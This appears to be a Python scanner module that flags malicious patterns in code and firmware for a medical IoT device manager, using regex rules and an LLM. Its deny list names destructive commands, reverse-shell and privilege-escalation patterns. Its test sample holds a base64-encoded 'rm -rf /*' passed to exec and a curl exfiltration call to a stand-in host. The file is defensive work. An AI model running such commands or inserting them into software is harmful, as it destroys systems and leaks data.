"""
Malicious Code Detection Agent for Medical IoT Device Manager
Scans code, patches, and firmware updates for malicious patterns and security threats
"""

import os
import re
import hashlib
import logging
import json
import base64
from datetime import datetime
from groq import Groq
from dotenv import load_dotenv
from database_manager import db_manager

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class MaliciousCodeDetectionAgent:
    def __init__(self):
        """Initialize the Malicious Code Detection Agent with Groq API client"""
        api_key = os.environ.get("GROQ_API_KEY")
        if api_key:
            self.client = Groq(api_key=api_key)
            self.ai_enabled = True
        else:
            self.client = None
            self.ai_enabled = False
            logger.warning("Groq API key not set - AI analysis disabled")
        self.model = "openai/gpt-oss-120b"
        
        # Known malicious patterns (enhanced for medical IoT security)
        self.malicious_patterns = [
            r'eval\s*\(',  # eval() usage
            r'exec\s*\(',  # exec() usage
            r'__import__\s*\(',  # dynamic imports
            r'subprocess\.call',  # system calls
            r'subprocess\.run',  # system calls
            r'subprocess\.Popen',  # system calls
            r'os\.system',  # direct system commands
            r'os\.poweroff',  # system poweroff - CRITICAL
            r'os\.shutdown',  # system shutdown - CRITICAL
            r'os\.reboot',  # system reboot - CRITICAL
            r'shell=True',  # shell execution
            r'rm\s+-rf\s+/',  # filesystem destruction
            r'del\s+/[fFsS]\s+/[qQ]',  # Windows file deletion
            r'shutil\.rmtree\(\s*[\'\"]/[\'\"]\s*\)',  # Root directory deletion
            r'chmod\s+777\s+/etc/passwd',  # Privilege escalation
            r'sudo\s+su\s*-',  # Root access
            r'echo.*>>\s*/etc/passwd',  # User injection
            r'useradd.*-m.*-s',  # Backdoor user creation
            r'usermod.*-aG.*sudo',  # Privilege escalation
            r'pickle\.loads',  # unsafe deserialization
            r'input\(\)\s*\)',  # raw input
            r'raw_input\(\)',  # Python 2 raw input
            r'\.decode\s*\(\s*["\']hex["\']',  # hex decoding
            r'base64\.b64decode',  # base64 decoding (suspicious in certain contexts)
            r'urllib\.request\.urlopen',  # network requests
            r'socket\.socket',  # socket connections
            r'threading\.Thread',  # threading (can be suspicious)
            r'multiprocessing\.Process',  # process spawning
            r'ctypes\.',  # low-level system access
            r'wget.*http',  # downloading malware
            r'curl.*http',  # downloading malware
            r'nc\s+-l.*-p.*-e',  # netcat reverse shell
        ]
        
        # Suspicious file extensions and types
        self.suspicious_extensions = ['.exe', '.bat', '.cmd', '.scr', '.vbs', '.js', '.jar', '.com', '.pif']
        
    def scan_code_content(self, code_content, file_type="python", context=""):
        """
        Scan code content for malicious patterns
        
        Args:
            code_content (str): The code content to scan
            file_type (str): The type of code (python, javascript, etc.)
            context (str): Additional context about the code
            
        Returns:
            dict: Malicious code detection results
        """
        try:
            # Basic pattern matching
            pattern_matches = []
            for pattern in self.malicious_patterns:
                matches = re.finditer(pattern, code_content, re.IGNORECASE)
                for match in matches:
                    pattern_matches.append({
                        "pattern": pattern,
                        "match": match.group(),
                        "line": code_content[:match.start()].count('\n') + 1,
                        "context": code_content[max(0, match.start()-50):match.end()+50]
                    })
            
            # Calculate hash for tracking
            code_hash = hashlib.sha256(code_content.encode('utf-8')).hexdigest()
            
            # Check for suspicious characteristics
            suspicious_features = self.analyze_suspicious_features(code_content, file_type)
            
            # Use AI for advanced analysis
            ai_analysis = self.ai_malware_analysis(code_content, file_type, context)
            
            # Combine results
            detection_result = {
                "scan_timestamp": datetime.now().isoformat(),
                "code_hash": code_hash,
                "file_type": file_type,
                "pattern_matches": pattern_matches,
                "suspicious_features": suspicious_features,
                "ai_analysis": ai_analysis,
                "risk_score": self.calculate_risk_score(pattern_matches, suspicious_features, ai_analysis),
                "is_malicious": False,  # Will be determined by risk score
                "recommendations": []
            }
            
            # Determine if code is malicious based on risk score AND AI analysis
            ai_threat_level = ai_analysis.get("threat_level", "none")
            ai_probability = ai_analysis.get("malicious_probability", 0)
            
            # Convert probability to percentage if it's a decimal
            if ai_probability <= 1.0:
                ai_probability *= 100
            
            # Mark as malicious if:
            # 1. Risk score >= 80, OR
            # 2. AI probability >= 80%, OR 
            # 3. AI threat level is "critical" or "high"
            is_high_ai_threat = ai_threat_level in ["critical", "high"] or ai_probability >= 80
            
            if detection_result["risk_score"] >= 80 or is_high_ai_threat:
                detection_result["is_malicious"] = True
                detection_result["severity"] = "high"
            elif detection_result["risk_score"] >= 60 or ai_probability >= 60:
                detection_result["severity"] = "medium"
            elif detection_result["risk_score"] >= 30 or ai_probability >= 30:
                detection_result["severity"] = "low"
            else:
                detection_result["severity"] = "clean"
            
            # Generate recommendations
            detection_result["recommendations"] = self.generate_recommendations(detection_result)
            
            # Store results
            self.store_detection_result(detection_result, context)
            
            logger.info(f"Code scan completed. Risk score: {detection_result['risk_score']}, Severity: {detection_result['severity']}")
            return detection_result
            
        except Exception as e:
            logger.error(f"Error scanning code content: {e}")
            return {
                "scan_timestamp": datetime.now().isoformat(),
                "error": str(e),
                "risk_score": 0,
                "is_malicious": False,
                "severity": "error"
            }
    
    def analyze_suspicious_features(self, code_content, file_type):
        """
        Analyze code for suspicious features beyond pattern matching
        
        Args:
            code_content (str): The code to analyze
            file_type (str): The type of code
            
        Returns:
            dict: Analysis of suspicious features
        """
        features = {
            "obfuscation_detected": False,
            "unusual_encoding": False,
            "large_data_blocks": False,
            "suspicious_imports": [],
            "network_activity": False,
            "file_operations": False,
            "system_calls": False,
            "encryption_usage": False
        }
        
        try:
            # Check for obfuscation
            if self.detect_obfuscation(code_content):
                features["obfuscation_detected"] = True
            
            # Check for unusual encoding
            if self.detect_unusual_encoding(code_content):
                features["unusual_encoding"] = True
            
            # Check for large data blocks (potential payloads)
            if self.detect_large_data_blocks(code_content):
                features["large_data_blocks"] = True
            
            # Check for suspicious imports/modules
            features["suspicious_imports"] = self.detect_suspicious_imports(code_content, file_type)
            
            # Check for network activity
            if self.detect_network_activity(code_content):
                features["network_activity"] = True
            
            # Check for file operations
            if self.detect_file_operations(code_content):
                features["file_operations"] = True
            
            # Check for system calls
            if self.detect_system_calls(code_content):
                features["system_calls"] = True
            
            # Check for encryption usage
            if self.detect_encryption_usage(code_content):
                features["encryption_usage"] = True
            
        except Exception as e:
            logger.error(f"Error analyzing suspicious features: {e}")
            features["analysis_error"] = str(e)
        
        return features
    
    def detect_obfuscation(self, code_content):
        """Detect code obfuscation techniques"""
        obfuscation_indicators = [
            len([c for c in code_content if c.isalnum()]) / len(code_content) < 0.7,  # Low alphanumeric ratio
            code_content.count('\\x') > 10,  # Many hex escapes
            code_content.count('\\u') > 5,   # Many unicode escapes
            len(re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', code_content)) < len(code_content) / 20,  # Few identifiers
            code_content.count(';') > code_content.count('\n') * 2,  # Many semicolons (compressed code)
        ]
        return sum(obfuscation_indicators) >= 2
    
    def detect_unusual_encoding(self, code_content):
        """Detect unusual encoding patterns"""
        encoding_patterns = [
            r'\\x[0-9a-fA-F]{2}',  # Hex encoding
            r'\\u[0-9a-fA-F]{4}',  # Unicode encoding
            r'%[0-9a-fA-F]{2}',    # URL encoding
            r'&#\d+;',             # HTML entity encoding
        ]
        return sum(len(re.findall(pattern, code_content)) for pattern in encoding_patterns) > 20
    
    def detect_large_data_blocks(self, code_content):
        """Detect large blocks of data that might be payloads"""
        lines = code_content.split('\n')
        long_lines = [line for line in lines if len(line) > 200]
        base64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')
        base64_lines = [line for line in long_lines if base64_pattern.match(line.strip())]
        return len(base64_lines) > 3 or len(long_lines) > 10
    
    def detect_suspicious_imports(self, code_content, file_type):
        """Detect suspicious imports or modules"""
        suspicious_modules = {
            'python': ['os', 'subprocess', 'ctypes', 'pickle', 'marshal', 'imp', 'importlib', 'socket', 'urllib', 'requests'],
            'javascript': ['child_process', 'fs', 'net', 'http', 'https', 'crypto'],
            'general': ['system', 'exec', 'eval', 'shell']
        }
        
        detected = []
        modules_to_check = suspicious_modules.get(file_type, []) + suspicious_modules.get('general', [])
        
        for module in modules_to_check:
            if file_type == 'python':
                patterns = [f'import {module}', f'from {module}', f'__import__("{module}")']
            else:
                patterns = [f'require("{module}")', f'import {module}', f'from "{module}"']
            
            for pattern in patterns:
                if pattern in code_content:
                    detected.append(module)
                    break
        
        return list(set(detected))
    
    def detect_network_activity(self, code_content):
        """Detect network-related activity"""
        network_patterns = [
            r'urllib\.',
            r'requests\.',
            r'socket\.',
            r'http\.',
            r'https\.',
            r'fetch\(',
            r'XMLHttpRequest',
            r'axios\.',
        ]
        return any(re.search(pattern, code_content, re.IGNORECASE) for pattern in network_patterns)
    
    def detect_file_operations(self, code_content):
        """Detect file system operations"""
        file_patterns = [
            r'open\s*\(',
            r'file\s*\(',
            r'\.read\s*\(',
            r'\.write\s*\(',
            r'os\.remove',
            r'os\.unlink',
            r'shutil\.',
            r'fs\.',
        ]
        return any(re.search(pattern, code_content, re.IGNORECASE) for pattern in file_patterns)
    
    def detect_system_calls(self, code_content):
        """Detect system calls and command execution"""
        system_patterns = [
            r'os\.system',
            r'subprocess\.',
            r'popen\s*\(',
            r'shell=True',
            r'exec\s*\(',
            r'eval\s*\(',
            r'child_process\.',
        ]
        return any(re.search(pattern, code_content, re.IGNORECASE) for pattern in system_patterns)
    
    def detect_encryption_usage(self, code_content):
        """Detect encryption or cryptographic operations"""
        crypto_patterns = [
            r'crypto\.',
            r'cryptography\.',
            r'hashlib\.',
            r'hmac\.',
            r'ssl\.',
            r'tls\.',
            r'encrypt',
            r'decrypt',
            r'cipher',
        ]
        return any(re.search(pattern, code_content, re.IGNORECASE) for pattern in crypto_patterns)
    
    def ai_malware_analysis(self, code_content, file_type, context):
        """
        Use AI to analyze code for malicious behavior
        
        Args:
            code_content (str): The code to analyze
            file_type (str): The type of code
            context (str): Additional context
            
        Returns:
            dict: AI analysis results
        """
        try:
            if not self.ai_enabled:
                # Basic analysis without AI
                ai_analysis = {
                    "malicious_probability": 30,  # Default conservative estimate
                    "threat_level": "medium",
                    "attack_types": ["unknown"],
                    "suspicious_behaviors": [{"behavior": "ai_disabled", "severity": "low", "description": "AI analysis disabled - Groq API key not available"}],
                    "potential_impact": "Cannot determine without AI analysis",
                    "confidence_score": 20,
                    "analysis_summary": "Basic pattern matching only - AI analysis disabled"
                }
            else:
                # Truncate code if too long for AI analysis
                if len(code_content) > 5000:
                    code_sample = code_content[:2500] + "\n... [truncated] ...\n" + code_content[-2500:]
                else:
                    code_sample = code_content
                
                prompt = f"""
                As a cybersecurity expert specializing in malware detection, analyze this {file_type} code for malicious behavior:
                
                Context: {context}
                
                Code to analyze:
                ```{file_type}
                {code_sample}
                ```
                
                Analyze for:
                1. Malicious Intent: Does this code appear designed to cause harm?
                2. Suspicious Behavior: Any unusual or concerning patterns?
                3. Attack Vectors: Potential security vulnerabilities or exploits?
                4. Data Exfiltration: Any signs of data theft or unauthorized access?
                5. System Compromise: Attempts to gain unauthorized system access?
                6. Obfuscation: Is the code intentionally hidden or obscured?
                
                Provide analysis in JSON format:
                {{
                    "malicious_probability": number,
                    "threat_level": "none|low|medium|high|critical",
                    "attack_types": ["type1", "type2"],
                    "suspicious_behaviors": [
                        {{"behavior": "string", "severity": "low|medium|high", "description": "string"}}
                    ],
                    "potential_impact": "string",
                    "confidence_score": number,
                    "analysis_summary": "string"
                }}
                """
                
                response = self.client.chat.completions.create(
                    messages=[{"role": "user", "content": prompt}],
                    model=self.model,
                    temperature=0.2,  # Lower temperature for more consistent analysis
                    max_tokens=1500
                )
                
                analysis_text = response.choices[0].message.content
            
            try:
                ai_analysis = json.loads(analysis_text)
            except json.JSONDecodeError:
                ai_analysis = {
                    "malicious_probability": 50,
                    "threat_level": "medium",
                    "attack_types": ["unknown"],
                    "suspicious_behaviors": [{"behavior": "analysis_parsing_failed", "severity": "low", "description": "Could not parse AI analysis"}],
                    "potential_impact": "Unknown - analysis parsing failed",
                    "confidence_score": 30,
                    "analysis_summary": analysis_text[:200] if analysis_text else "AI analysis failed"
                }
            
            logger.info(f"AI analysis completed. Threat level: {ai_analysis.get('threat_level', 'unknown')}")
            return ai_analysis
            
        except Exception as e:
            logger.error(f"Error in AI analysis: {e}")
            return {
                "malicious_probability": 0,
                "threat_level": "none",
                "attack_types": [],
                "suspicious_behaviors": [{"behavior": "analysis_error", "severity": "low", "description": str(e)}],
                "potential_impact": "Analysis failed",
                "confidence_score": 0,
                "analysis_summary": f"AI analysis error: {str(e)}"
            }
    
    def calculate_risk_score(self, pattern_matches, suspicious_features, ai_analysis):
        """
        Calculate overall risk score (0-100)
        
        Args:
            pattern_matches (list): Pattern matching results
            suspicious_features (dict): Suspicious feature analysis
            ai_analysis (dict): AI analysis results
            
        Returns:
            int: Risk score (0-100)
        """
        try:
            score = 0
            
            # Pattern matching score (0-30 points)
            pattern_score = min(30, len(pattern_matches) * 5)
            score += pattern_score
            
            # Suspicious features score (0-30 points)
            feature_score = 0
            if suspicious_features.get("obfuscation_detected"):
                feature_score += 10
            if suspicious_features.get("unusual_encoding"):
                feature_score += 8
            if suspicious_features.get("large_data_blocks"):
                feature_score += 6
            if suspicious_features.get("network_activity"):
                feature_score += 4
            if suspicious_features.get("system_calls"):
                feature_score += 8
            if len(suspicious_features.get("suspicious_imports", [])) > 3:
                feature_score += 6
            
            score += min(30, feature_score)
            
            # AI analysis score (0-40 points)
            ai_probability = ai_analysis.get("malicious_probability", 0)
            threat_level = ai_analysis.get("threat_level", "none")
            
            # Convert probability to percentage if it's a decimal (0-1 range)
            if ai_probability <= 1.0:
                ai_probability *= 100
            
            ai_score = (ai_probability / 100) * 40
            
            # Bonus for high threat level
            threat_bonus = {"critical": 10, "high": 8, "medium": 4, "low": 2, "none": 0}
            ai_score += threat_bonus.get(threat_level, 0)
            
            score += min(40, ai_score)
            
            return min(100, int(score))
            
        except Exception as e:
            logger.error(f"Error calculating risk score: {e}")
            return 50  # Default medium risk
    
    def generate_recommendations(self, detection_result):
        """Generate security recommendations based on detection results"""
        recommendations = []
        
        try:
            risk_score = detection_result.get("risk_score", 0)
            severity = detection_result.get("severity", "clean")
            pattern_matches = detection_result.get("pattern_matches", [])
            suspicious_features = detection_result.get("suspicious_features", {})
            
            if risk_score >= 80:
                recommendations.extend([
                    "CRITICAL: Block this code immediately - high malware probability",
                    "Quarantine any systems that may have executed this code",
                    "Conduct forensic analysis of affected systems",
                    "Review security logs for signs of compromise"
                ])
            elif risk_score >= 60:
                recommendations.extend([
                    "WARNING: Review this code carefully before execution",
                    "Run in isolated/sandboxed environment if needed",
                    "Monitor system behavior if code must be executed",
                    "Consider additional security scanning"
                ])
            elif risk_score >= 30:
                recommendations.extend([
                    "CAUTION: Code contains potentially risky elements",
                    "Review suspicious patterns and imports",
                    "Ensure proper input validation and sanitization",
                    "Monitor for unexpected behavior"
                ])
            
            # Specific recommendations based on detected features
            if pattern_matches:
                recommendations.append(f"Review {len(pattern_matches)} detected suspicious patterns")
            
            if suspicious_features.get("obfuscation_detected"):
                recommendations.append("Code appears obfuscated - investigate purpose")
            
            if suspicious_features.get("network_activity"):
                recommendations.append("Monitor network connections if code is executed")
            
            if suspicious_features.get("system_calls"):
                recommendations.append("Restrict system privileges for code execution")
            
            if not recommendations:
                recommendations.append("Code appears clean - standard security practices apply")
            
        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")
            recommendations.append("Error generating recommendations - manual review required")
        
        return recommendations
    
    def scan_file(self, file_path):
        """
        Scan a file for malicious content
        
        Args:
            file_path (str): Path to the file to scan
            
        Returns:
            dict: Scan results
        """
        try:
            # Check file extension
            file_ext = os.path.splitext(file_path)[1].lower()
            
            # Determine file type
            if file_ext in ['.py']:
                file_type = 'python'
            elif file_ext in ['.js', '.ts']:
                file_type = 'javascript'
            elif file_ext in ['.java']:
                file_type = 'java'
            elif file_ext in ['.c', '.cpp', '.h']:
                file_type = 'c'
            else:
                file_type = 'text'
            
            # Read file content
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Scan content
            result = self.scan_code_content(content, file_type, f"File: {file_path}")
            result["file_path"] = file_path
            result["file_size"] = os.path.getsize(file_path)
            
            return result
            
        except Exception as e:
            logger.error(f"Error scanning file {file_path}: {e}")
            return {
                "file_path": file_path,
                "error": str(e),
                "risk_score": 0,
                "is_malicious": False,
                "severity": "error"
            }
    
    def store_detection_result(self, detection_result, context):
        """Store malicious code detection results in database"""
        try:
            db_manager.log_security_event(
                event_type="malware_scan",
                severity=detection_result.get("severity", "info"),
                description=f"Malicious code scan completed - Risk score: {detection_result.get('risk_score', 0)}",
                source_ip="internal",
                additional_data={
                    "scan_type": "malicious_code_detection",
                    "risk_score": detection_result.get("risk_score", 0),
                    "is_malicious": detection_result.get("is_malicious", False),
                    "pattern_matches": len(detection_result.get("pattern_matches", [])),
                    "ai_threat_level": detection_result.get("ai_analysis", {}).get("threat_level", "none"),
                    "context": context
                }
            )
        except Exception as e:
            logger.error(f"Error storing detection result: {e}")
    
    def get_detection_report(self):
        """Generate a comprehensive malware detection report"""
        try:
            # Get recent scan events
            all_events = db_manager.get_all_security_events()
            scan_events = [
                event for event in all_events 
                if event.get('event_type') == 'malware_scan'
            ]
            
            if not scan_events:
                return {
                    "summary": "No malware scans found",
                    "total_scans": 0,
                    "recommendations": ["Perform malware scans to generate security insights"]
                }
            
            # Generate statistics
            total_scans = len(scan_events)
            malicious_count = sum(
                1 for event in scan_events 
                if event.get('additional_data', {}).get('is_malicious', False)
            )
            
            avg_risk_score = sum(
                event.get('additional_data', {}).get('risk_score', 0) 
                for event in scan_events
            ) / total_scans
            
            # Threat level distribution
            threat_levels = {}
            for event in scan_events:
                level = event.get('additional_data', {}).get('ai_threat_level', 'none')
                threat_levels[level] = threat_levels.get(level, 0) + 1
            
            report = {
                "summary": f"Completed {total_scans} malware scans",
                "total_scans": total_scans,
                "malicious_detections": malicious_count,
                "clean_files": total_scans - malicious_count,
                "average_risk_score": round(avg_risk_score, 2),
                "threat_level_distribution": threat_levels,
                "recent_scans": scan_events[-10:],  # Last 10 scans
                "recommendations": [
                    "Continue regular malware scanning",
                    "Investigate any high-risk detections",
                    "Update security policies based on findings"
                ]
            }
            
            if malicious_count > 0:
                report["recommendations"].insert(0, f"URGENT: {malicious_count} malicious files detected - review immediately")
            
            return report
            
        except Exception as e:
            logger.error(f"Error generating detection report: {e}")
            return {
                "summary": f"Error generating report: {str(e)}",
                "total_scans": 0,
                "recommendations": ["Check system logs for errors"]
            }

def main():
    """Test the Malicious Code Detection Agent"""
    agent = MaliciousCodeDetectionAgent()
    
    # Test with a suspicious code sample
    suspicious_code = '''
import os
import subprocess
import base64

encoded_payload = "aW1wb3J0IG9zCm9zLnN5c3RlbSgicm0gLXJmIC8qIik="
decoded = base64.b64decode(encoded_payload).decode()
exec(decoded)
subprocess.call("curl http://malicious-site.com/steal-data", shell=True)
    '''
    
    print("Testing Malicious Code Detection Agent...")
    result = agent.scan_code_content(suspicious_code, "python", "Test suspicious code")
    print(f"Scan completed:")
    print(f"Risk Score: {result.get('risk_score', 'N/A')}")
    print(f"Is Malicious: {result.get('is_malicious', 'N/A')}")
    print(f"Severity: {result.get('severity', 'N/A')}")
    print(f"Pattern Matches: {len(result.get('pattern_matches', []))}")
    print(f"AI Threat Level: {result.get('ai_analysis', {}).get('threat_level', 'N/A')}")
    
    # Generate report
    report = agent.get_detection_report()
    print(f"Detection report: {json.dumps(report, indent=2)}")

if __name__ == "__main__":
    main()